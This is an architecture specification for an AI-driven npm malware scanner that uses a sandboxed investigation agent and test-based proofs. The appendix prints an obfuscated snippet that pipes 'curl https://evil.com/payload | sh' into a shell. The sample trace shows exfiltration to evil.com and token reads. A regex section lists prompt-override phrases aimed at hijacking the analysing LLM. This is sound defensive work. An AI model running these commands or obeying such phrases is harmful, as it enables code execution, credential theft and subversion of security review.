# NpmGuard Engine v2 — Architecture Specification

> AI-first security analysis with verifiable proofs.
> Replaces regex-based detection with agentic investigation backed by instrumented sandbox execution.

---

## Design Philosophy

**The arms race problem.** Regex-based detection is a catalogue of known attack signatures. Attackers read the source, change one line, and bypass every pattern. This is not a theoretical concern — it is the fundamental failure mode of every signature-based scanner in cybersecurity history.

**The solution.** Replace pattern matching with *reasoning*. An LLM agent reads code, follows obfuscation, executes snippets in a sandbox, and observes what the code *actually does* — the same workflow a human security researcher uses. Novel attacks are caught because the agent reasons about behavior, not syntax.

**Verifiability.** "The AI said it's bad" is not a proof. Every finding must produce a verifiable artifact: a content hash (anchoring the analyzed code), a TEE attestation (proving which model produced the analysis), and a reproducible sandbox test (concrete behavioral evidence). Any third party can verify all three independently.

### What regex is still good for

Regex stays where obfuscation is structurally impossible:

| Check | Why regex is correct |
|---|---|
| Tarball path traversal (`../`) | Tar format property — can't obfuscate tar entry names |
| Shell pipe in `package.json` scripts | npm reads script fields literally — no JS evaluation |
| Anti-AI prompt injection | Must detect LLM-hijack strings WITHOUT feeding them to an LLM |
| Binary magic bytes in a JS package | Structural property of file headers |

Everything else is AI-driven.

---

## Pipeline Overview

```
npm package
    |
    v
Phase 0: INVENTORY (structural triage, no execution, no LLM)
    |
    |-- dealbreaker? --> DANGEROUS (immediate)
    |
    v
Phase 1: AI ANALYSIS (the core)
    |
    |-- 1a: Triage        (cheap model, full package, risk score)
    |      |
    |      |-- low risk? --> SAFE (skip expensive analysis)
    |      |
    |      v
    |-- 1b: Investigation  (powerful model, agentic loop, Docker sandbox tools)
    |      |
    |      v
    |-- 1c: Test gen       (auto-generate Vitest proof tests from findings)
    |
    v
Phase 2: PROOF VERIFICATION
    |-- re-run generated tests (deterministic confirmation)
    |-- re-hash source files (content integrity)
    |-- TEE attestation record (verifiable inference)
    |
    v
AuditReport { verdict, capabilities, proofs[] }
```

---

## Phase 0: Inventory

**Unchanged from v1.** Fast structural triage (~30 sec). No JS execution. No LLM.

- Parse `package.json` (lifecycle scripts, entry points, dependencies)
- Walk file tree, classify files by extension and magic bytes
- Run dealbreaker checks (path traversal, shell pipes, missing install files)
- Accumulate structural flags (binaries, dotfiles, encoded content, minified scripts)

**Output:** `InventoryReport` with metadata, scripts, entry points, file classification, flags, optional dealbreaker.

If dealbreaker is found, pipeline stops immediately with `DANGEROUS` verdict.

---

## Phase 1: AI Analysis

### Phase 1a: Triage

**Goal:** Cheap, fast risk assessment to filter out the 80-90% of packages that are obviously benign (lodash, express, etc.), saving the cost of deep analysis.

**Model:** Haiku-class or equivalent cheap model with large context window.

**Input:** The entire package content. Every file, untruncated. If a file is too large to fit in context, that is itself a red flag and gets flagged as such.

Specifically:
- Full `package.json`
- Complete source of every `.js`, `.mjs`, `.cjs`, `.ts`, `.json` file
- Inventory flags from Phase 0
- File listing with sizes

**Output:** Structured response:

```python
class TriageResult(BaseModel):
    risk_score: int             # 0-10
    risk_summary: str           # one-line explanation
    focus_areas: list[FocusArea]

class FocusArea(BaseModel):
    file: str                   # e.g. "lib/loader.js"
    lines: str | None           # e.g. "42-80" (optional, LLM may not always know)
    reason: str                 # e.g. "obfuscated string concatenation building a URL"
```

**Decision threshold:** If `risk_score < 3`, return `SAFE` immediately. This is aggressive filtering — most legitimate packages will score 0-2.

**What the triage model looks for** (via system prompt, not regex):
- Install scripts that do anything beyond running node on a file
- Network calls in unexpected places
- Obfuscation patterns (string concatenation, base64, eval chains)
- Filesystem access to sensitive paths
- Environment variable harvesting
- Code that doesn't match the package's stated purpose
- Encoded or encrypted data blobs
- Anything else that looks suspicious

The triage prompt is intentionally broad. We want false positives here (caught by 1b), not false negatives (missed entirely).

### Phase 1b: Agentic Investigation

**Goal:** Deep, multi-turn AI analysis of suspicious code. The agent reads code, forms hypotheses, executes snippets in a sandboxed Docker container, observes results, and follows leads. This is the core of the system.

**Model:** Sonnet/Opus-class. The most capable model available.

**Turn budget:** Configurable parameter (`max_agent_turns`, default: 30). The agent gets this many tool-call turns to investigate. For simple packages this is overkill; for complex obfuscated payloads the agent may use all of them.

**Architecture — the glovebox model:**

```
+-----------------------------------------+
|  AGENT PROCESS (host, secure)           |
|                                         |
|  LLM  <-->  Tool Router                 |
|              |          |               |
|         READ tools   EXECUTE tools      |
|         (host fs)    (Docker API)       |
|              |          |               |
+--------------+----------+---------------+
               |          |
               |     +----v-----------------+
               |     | DOCKER SANDBOX        |
               |     | (ephemeral container) |
               |     |                       |
               |     | - no outbound network |
               |     |   (except proxy)      |
               |     | - no host mounts      |
               |     | - drops root          |
               |     | - tmpfs, no persist   |
               |     | - instrumentation     |
               |     |   preloaded           |
               |     | - hard timeout per    |
               |     |   exec (10-15 sec)    |
               |     +----------------------+
               |
          +----v-----------------+
          | EXTRACTED TARBALL     |
          | (read-only on host)   |
          +----------------------+
```

The agent runs on the host (or a separate secure container). The malicious package runs ONLY inside the Docker sandbox. The agent interacts with the sandbox through the Docker API (`docker exec`). If the package exploits a Node.js vulnerability, escapes the sandbox, or tries to corrupt the agent — it's trapped in the container. The agent gets back either output or an error.

**Agent tools:**

READ tools (operate on host-side extracted tarball, no Docker needed):

| Tool | Description |
|---|---|
| `read_file(path)` | Read any file in the package |
| `list_files()` | List all files with sizes and types |
| `search(pattern)` | Regex search across all files |

EXECUTE tools (run inside Docker sandbox via `docker exec`):

| Tool | Description |
|---|---|
| `eval_js(code)` | Run a JS snippet, return `{stdout, stderr, exit_code}`. For deobfuscation: "what does `atob('Y2hpbGRf...')` decode to?" |
| `require_and_trace(entrypoint)` | Load the package with JS monkey-patch instrumentation preloaded (see Instrumentation section). Returns structured log of everything the package did. |
| `run_lifecycle_hook(hook_name)` | Run a specific lifecycle script (preinstall/postinstall) with instrumentation. |
| `fast_forward_timers(entrypoint, advance_ms)` | Load the package with fake timers, then advance by N ms. For triggering delayed payloads (time bombs, staged attacks). |

Each EXECUTE tool has a hard timeout (configurable, default 15 sec). If the package hangs or infinite-loops, the exec times out, and `{exit_code: -1, stderr: "timeout"}` is returned. Timeout itself is evidence (DoS capability).

**Output sanitization:** Docker stdout/stderr is truncated to a max size (e.g., 64KB), stripped of ANSI codes, and checked for prompt injection patterns before being passed to the LLM. A malicious package could flood stdout hoping to manipulate the agent's context — the tool router prevents this.

**Agent system prompt** directs the investigation:

1. Read the package code, starting from focus areas identified by triage
2. Follow require chains, trace data flow
3. If you see obfuscated code, use `eval_js()` to decode it
4. Use `require_and_trace()` to see what the package actually does at runtime
5. For each suspicious behavior, document:
   - What capability it demonstrates (from CapabilityEnum)
   - What attack pathway it matches (from AttackPathway, or "NOVEL")
   - The file and line range with evidence
   - A hypothesis for how to prove it in a reproducible test
6. If the package has lifecycle hooks, investigate those first (highest risk)
7. If you find a time-gated payload, use `fast_forward_timers()` to trigger it

**Output:**

```python
class Finding(BaseModel):
    capability: CapabilityEnum
    attack_pathway: AttackPathway | str  # known pathway or "NOVEL"
    confidence: Confidence               # SUSPECTED, LIKELY, CONFIRMED
    file: str
    lines: str | None
    evidence: str                        # what was observed
    reasoning: str                       # agent's chain of thought
    reproduction_strategy: str           # how to prove this in a test

class Confidence(StrEnum):
    SUSPECTED = "SUSPECTED"   # code looks suspicious but not confirmed
    LIKELY = "LIKELY"         # multiple signals corroborate
    CONFIRMED = "CONFIRMED"   # observed in sandbox execution
```

Findings with `CONFIRMED` confidence (agent saw the behavior in sandbox) are the strongest. `SUSPECTED` and `LIKELY` findings still produce proofs but at lower confidence, and the auto-generated test in Phase 1c is their chance to upgrade to `CONFIRMED`.

### Phase 1c: Test Generation

**Goal:** For each finding from 1b, auto-generate a self-contained Vitest test that proves the behavior. This is the bridge between AI analysis and deterministic proof.

**Model:** Sonnet-class.

**Input:** Findings from 1b + the package source.

**Output:** One `.test.js` file per finding (or a single file with multiple test cases).

**What the generated test does:**
- Sets up the right environment stubs (`vi.stubEnv`)
- Installs MSW HTTP handlers to intercept network calls
- Spies on the right functions (`vi.spyOn`)
- Sets fake timers if needed (`vi.useFakeTimers`)
- Loads/requires the package
- Advances timers if needed
- Asserts the claimed behavior

**Example — auto-generated test for credential theft:**

```javascript
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { server } from '../harness/server.js';
import { http, HttpResponse } from 'msw';
import { runPackage } from '../harness/sandbox-runner.js';

describe('credential-theft: reads NPM_TOKEN and POSTs to C2', () => {
  let capturedBody = null;

  beforeEach(() => {
    vi.stubEnv('NPM_TOKEN', 'canary-token-npmguard-test');
    server.use(
      http.post('*', async ({ request }) => {
        capturedBody = await request.text();
        return HttpResponse.json({ ok: true });
      })
    );
  });

  afterEach(() => { vi.unstubAllEnvs(); });

  it('exfiltrates NPM_TOKEN via HTTP POST', async () => {
    await runPackage('the-package');
    expect(capturedBody).toContain('canary-token-npmguard-test');
  });
});
```

The generated test is saved alongside the package analysis artifacts and becomes part of the proof chain.

---

## Phase 2: Proof Verification

Re-verifies all findings to produce the final proof set.

### For static findings (from Phase 1b):
- Re-hash the source file at the referenced `file:lines`
- Compare against the `content_hash` recorded at investigation time
- If match: `reproducible = true`

### For dynamic findings (from Phase 1b sandbox execution):
- Mark `reproducible = true` if instrumentation logs are consistent
- Record the Docker exec command as `reproduction_cmd`

### For auto-generated tests (from Phase 1c):
- Re-run each Vitest test in the sandbox
- Passing test: upgrades finding confidence to `CONFIRMED`
- Failing test: finding stays at original confidence (still reported, but noted as unconfirmed)
- Test result + hash becomes part of proof

### TEE attestation (0G Compute):
- If running through 0G Compute, the LLM inference in phases 1a and 1b produces TEE attestation
- Attestation proves: which model, which input, which output — tamper-proof
- Attestation ID stored in proof metadata

---

## Proof Model

```python
class ProofKind(StrEnum):
    # Structural (regex, unevadable)
    STRUCTURAL = "STRUCTURAL"

    # AI-discovered (LLM reasoning)
    AI_STATIC = "AI_STATIC"             # found by reading code
    AI_DYNAMIC = "AI_DYNAMIC"           # found by executing in sandbox

    # Auto-generated test
    TEST_CONFIRMED = "TEST_CONFIRMED"   # auto-generated vitest passed
    TEST_UNCONFIRMED = "TEST_UNCONFIRMED"  # test was generated but failed

class Proof(BaseModel):
    # What was found
    capability: CapabilityEnum
    attack_pathway: AttackPathway | str
    confidence: Confidence

    # Where in the code
    file_line: str               # "lib/loader.js:42-67"
    problem: str                 # human-readable description
    evidence: str                # concrete data (truncated to 500 chars)

    # Verifiability
    kind: ProofKind
    content_hash: str            # SHA-256 of source file at detection time

    # Reproducibility
    reproducible: bool
    reproduction_cmd: str | None      # command to re-verify
    test_file: str | None             # path to auto-generated test
    test_hash: str | None             # SHA-256 of test file

    # AI provenance
    reasoning_hash: str | None        # SHA-256 of agent reasoning trace
    tee_attestation_id: str | None    # 0G Compute attestation ID
```

### Proof verification by third parties

Anyone can verify a proof independently:

1. **Content integrity:** Download the package, hash the file at `file_line` -> must match `content_hash`
2. **Test reproduction:** Run the test at `test_file` -> must pass (for `TEST_CONFIRMED` proofs)
3. **AI provenance:** Verify TEE attestation via 0G Compute -> proves which model produced the analysis
4. **Reasoning audit:** Hash the full reasoning trace -> must match `reasoning_hash`

---

## Instrumentation Layer

The Docker sandbox preloads a Node.js instrumentation module that monkey-patches sensitive APIs before the package code runs.

**Current implementation: JS monkey-patching** via `node --require ./instrument.js <entrypoint>`.

**Future roadmap: kernel-level tracing** (strace/eBPF) for comprehensive coverage including native addons. The JS monkey-patch layer will remain as the primary structured data source; kernel tracing adds a second, tamper-proof observation layer.

### What is instrumented

| Category | Hooked APIs | What is logged |
|---|---|---|
| Module loading | `require()`, `Module._compile()` | Module path, resolved file, dynamic require detection |
| Filesystem | `fs.readFile*`, `fs.writeFile*`, `fs.access`, `fs.stat` | Operation, path, content summary (first 256 bytes for reads) |
| Network | `http.request`, `https.request`, `net.connect`, `dns.resolve*` | Method, URL/host, port, headers, body summary |
| Process | `child_process.exec*`, `spawn*`, `fork` | Command, arguments, env passed |
| Environment | `process.env` (Proxy) | Every key accessed |
| Crypto | `crypto.createDecipher*`, `crypto.createHash` | Algorithm, key length (NOT key value) |
| Dynamic code | `eval()`, `Function()`, `vm.runInNewContext()` | Code string (truncated) |
| Timers | `setTimeout`, `setInterval` | Delay/interval in ms, callback source location |

### Output format

The instrumentation module writes structured JSON to stdout:

```json
{
  "modules_loaded": ["fs", "https", "child_process", "./lib/hidden.js"],
  "network_calls": [
    {"method": "POST", "url": "https://evil.com/exfil", "body_preview": "{\"token\":\"..."}
  ],
  "fs_operations": [
    {"op": "read", "path": "/home/user/.npmrc", "preview": "_authToken=npm_..."}
  ],
  "env_access": ["NPM_TOKEN", "AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN"],
  "process_spawns": [
    {"cmd": "curl", "args": ["-s", "https://evil.com/payload"]}
  ],
  "eval_calls": [
    {"code": "require('child_process').execSync('whoami')"}
  ],
  "crypto_ops": [
    {"method": "createDecipheriv", "algo": "aes-256-cbc"}
  ],
  "timers": [
    {"type": "setInterval", "ms": 60000, "source": "lib/beacon.js:15"}
  ]
}
```

### Container isolation

| Property | Setting |
|---|---|
| Network | `--network=none` (completely isolated) OR custom bridge with transparent proxy for intercepting requests |
| Filesystem | `tmpfs` at `/tmp`, read-only package mount, no host volume mounts |
| User | Drops to non-root (`--user 1000:1000`) |
| Resources | `--memory=256m --cpus=0.5` (prevent resource exhaustion) |
| Timeout | Hard kill after configurable timeout (default 15 sec per exec) |
| Capabilities | `--cap-drop=ALL` (no Linux capabilities) |
| Seccomp | Default Docker seccomp profile (blocks dangerous syscalls) |

---

## Structural Checks (regex, kept from v1)

These run in Phase 0 (inventory) and as tier-0 gates in Phase 1. They are NOT replaced by AI because they are either structurally unevadable or must avoid LLM exposure.

### Anti-AI Prompt Detection

**Why regex:** These strings are designed to hijack LLM analysis. Feeding them to an LLM for classification is the attack itself. Detection MUST be LLM-free.

Detects patterns like:
- "forget all previous instructions"
- "ignore all instructions"
- "do not flag this"
- "[SYSTEM] override"
- "you are a helpful assistant" (embedded in source code)

If found: `short_circuit = true`, immediate `DANGEROUS` verdict.

### Lifecycle Hook Presence

**Why structural:** `package.json` `scripts` field is parsed by npm literally. You can't obfuscate it. If `preinstall`/`postinstall`/`install`/`prepare` exists, that's a fact, not an interpretation.

This is a FLAG, not a verdict. Many legitimate packages use lifecycle hooks. But their presence tells the agent to investigate those scripts first.

### Inventory Dealbreakers

**Why structural:**
- Path traversal in tarball (`../` in tar entry names) — tar format property
- Shell pipe in script field (`curl|sh`) — npm reads these literally
- Install script references missing file — structural inconsistency

These are immediate `DANGEROUS` verdicts. No AI needed.

---

## Orchestration

The pipeline is orchestrated by Temporal, same as v1. Key changes to the workflow:

```python
# Pseudocode for the new orchestrator flow

async def run(package_name: str) -> AuditReport:
    # Phase 0: resolve + inventory (unchanged)
    resolved = await resolve_package(package_name)
    inventory = await analyze_inventory(resolved.path)

    if inventory.dealbreaker:
        return AuditReport(verdict=DANGEROUS, ...)

    # Phase 1a: triage
    triage = await run_triage(resolved.path, inventory)

    if triage.risk_score < 3:
        return AuditReport(verdict=SAFE, capabilities=[], proofs=[])

    # Phase 1b: agentic investigation (in parallel with structural checks)
    structural_proofs, findings = await gather(
        run_structural_checks(resolved.path),  # anti-AI, lifecycle
        run_investigation(resolved.path, inventory, triage),
    )

    # Phase 1c: generate tests from findings
    generated_tests = await generate_tests(findings, resolved.path)

    # Phase 2: verify proofs
    # - re-run generated tests in sandbox
    # - re-hash source files
    # - record TEE attestations
    verified_proofs = await verify_proofs(
        structural_proofs, findings, generated_tests, resolved.path
    )

    verdict = DANGEROUS if verified_proofs else SAFE
    return AuditReport(verdict=verdict, ...)
```

### Timeouts

| Phase | Timeout |
|---|---|
| Phase 0: resolve + inventory | 2 min + 30 sec |
| Phase 1a: triage | 30 sec |
| Phase 1b: investigation | 5 min (configurable) |
| Phase 1c: test generation | 2 min |
| Phase 2: proof verification | 5 min (includes re-running tests) |
| Per Docker exec | 15 sec (configurable) |

---

## Cost Model

| Phase | Model | Estimated cost | When it runs |
|---|---|---|---|
| Phase 0 | None | ~$0 | Always |
| Phase 1a (triage) | Haiku | ~$0.002 | Always (after Phase 0) |
| Phase 1b (investigation) | Sonnet/Opus | ~$0.10-0.50 | Only if risk >= 3 (~10-20% of packages) |
| Phase 1c (test gen) | Sonnet | ~$0.05-0.10 | Only if findings exist |
| Phase 2 (verification) | None (deterministic) | ~$0 | Only if findings exist |
| Docker sandbox | Compute | ~$0.01 | Only during investigation |

**Expected per-package cost:**
- Benign package (80-90%): ~$0.002 (triage only)
- Suspicious package investigated, clean: ~$0.15
- Malicious package, full pipeline: ~$0.20-0.60

---

## Configuration

```python
class EngineConfig(BaseModel):
    # Triage
    triage_model: str = "claude-haiku-4-5-20251001"
    triage_risk_threshold: int = 3          # skip deep analysis below this

    # Investigation
    investigation_model: str = "claude-sonnet-4-6"
    max_agent_turns: int = 30               # agent turn budget
    max_docker_exec_timeout_sec: int = 15   # per-exec timeout

    # Test generation
    test_gen_model: str = "claude-sonnet-4-6"

    # Docker
    sandbox_image: str = "npmguard-sandbox:latest"
    sandbox_memory_mb: int = 256
    sandbox_cpus: float = 0.5
    sandbox_network: str = "none"           # or "intercepted"

    # LLM provider
    llm_base_url: str | None = None         # for 0G Compute / custom endpoint
```

---

## What Catches What (v2)

| Attack Pattern | Phase 0 (Inventory) | Phase 1a (Triage) | Phase 1b (Investigation) | Auto-generated Test |
|---|---|---|---|---|
| `curl evil \| sh` in postinstall | DEALBREAKER | - | - | - |
| Shipped ELF binary | FLAG | risk++ | agent inspects what uses it | test: require package, check for execSync |
| `require(atob("Y2hpbGRf..."))` | - | risk++ | agent runs `eval_js(atob(...))` -> "child_process" | test: spy on child_process |
| AES-encrypted stage2 | encoded content FLAG | risk++ | agent traces crypto ops, decrypts in sandbox | test: spy on Module._compile |
| Env var theft via POST | - | risk++ (network + env) | agent runs `require_and_trace()`, sees POST with env data | test: stubEnv + intercept POST |
| Time bomb (48h delay) | - | risk++ (setTimeout) | agent uses `fast_forward_timers(48*3600*1000)` | test: fake timers + advance |
| Geo-gated wiper | - | risk++ (conditional + fs.write) | agent runs with mocked geo response, observes writes | test: mock geo API + spy on fs.write |
| Clipboard hijack | - | risk++ | agent sees clipboard API + address regex | test: mock clipboard API |
| Novel attack (never seen before) | maybe FLAG | LLM reasons "this is suspicious" | agent investigates, confirms in sandbox | test generated from findings |
| Anti-AI prompt injection | - | NOT FED TO LLM | STRUCTURAL check catches it (regex) | - |

---

## Roadmap

### Hackathon (now)
- [x] Phase 0: inventory (done)
- [ ] Phase 1a: triage agent with Haiku
- [ ] Phase 1b: investigation agent with Sonnet, Docker sandbox tools
- [ ] Phase 1c: test auto-generation
- [ ] Instrumentation module (JS monkey-patching)
- [ ] Docker sandbox container setup
- [ ] Phase 2: proof verification with test re-runs
- [ ] Updated Temporal orchestrator

### Post-hackathon
- [ ] Kernel-level instrumentation (strace/eBPF) as second observation layer
- [ ] Native addon analysis (currently out of scope)
- [ ] Environment fuzzing (multiple sandbox runs with different TZ/LANG/CI vars)
- [ ] Adversarial fuzzing (mitmproxy response injection for time-bomb testing)
- [ ] Dedicated instrumentation module that logs all fs/network/env/process calls as structured input to agent (replacing monkey-patches)
- [ ] Anti-sandbox evasion countermeasures (randomized instrumentation, behavioral diffing)
- [ ] Dependency chain analysis (analyze transitive dependencies)
- [ ] IPFS + ENS publishing of verified audit reports

---

## Appendix: Why Not Just Regex

A concrete example. Consider this real obfuscation pattern (WAVESHAPER variant):

```javascript
const _0x = ['\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'];
const m = require(_0x[0]);
m['exe' + 'cSync']('curl https://evil.com/payload | sh');
```

- **Regex for `child_process`:** MISS (hex-encoded string in array)
- **Regex for `execSync`:** MISS (string concatenation)
- **Regex for `curl`:** Maybe catches this specific case, but attacker switches to `https.request`
- **LLM reading code:** Likely catches it, but may hallucinate on deeper obfuscation
- **LLM + sandbox execution:** Agent runs `eval_js("'\\x63\\x68...'")` -> sees "child_process". Runs `require_and_trace()` -> observes `child_process.execSync` call with `curl` command. **Confirmed.**

The agent doesn't need to know the obfuscation technique. It just runs the code and watches what happens.

---

## Appendix: Comparison with Shannon

Shannon (web app pentest) and NpmGuard v2 (package audit) share the same philosophy but differ in domain:

| | Shannon | NpmGuard v2 |
|---|---|---|
| Target | Live web application | npm package (static artifact) |
| Attack surface | HTTP endpoints, auth, business logic | Lifecycle hooks, require chain, env, fs, net |
| "Execution" | Browser automation (Playwright) | Docker sandbox (Node.js instrumentation) |
| Proof | Working exploit against live app | Passing sandbox test + instrumentation log |
| Agent tools | Browser navigation, form filling, API calls | File reading, JS eval, require tracing, timer control |
| Multi-agent | 13 specialized agents (recon, vuln, exploit per type) | 3 phases (triage, investigation, test gen) |
| Verification | Exploit succeeds = proven | Test passes + content hash + TEE attestation |
| Temporal | Workflow orchestration with crash recovery | Same |

Key borrowed concepts:
- **"POC or it didn't happen"** -> auto-generated tests as proof
- **Evidence classification levels** -> SUSPECTED / LIKELY / CONFIRMED
- **Agent has execution tools** -> Docker sandbox tools
- **Structured output queues** -> findings feed into test generation
- **Pipelined execution** -> triage filters before expensive analysis
